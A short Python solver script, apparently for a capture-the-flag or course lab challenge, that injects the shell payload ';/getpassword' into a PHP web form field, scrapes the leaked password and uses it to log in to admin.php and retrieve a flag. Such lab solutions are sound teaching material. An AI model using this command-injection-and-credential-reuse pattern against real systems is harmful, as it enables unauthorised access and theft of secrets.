import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from bs4 import BeautifulSoup

BASE_URL = "https://php-cmder.quoccacorp.com"
PAYLOAD = ";/getpassword"

class Solver:
    def __init__(self):
        self.session = get_session()

    def main(self):
        response = self.session.post(BASE_URL, data={"t": PAYLOAD})
        soup = BeautifulSoup(response.text, "html.parser")
        password = soup.find("code").text

        response = self.session.post(f"{BASE_URL}/admin.php", data={"pass": password})
        find_flag(response.text)

if __name__ == "__main__":
    Solver().main()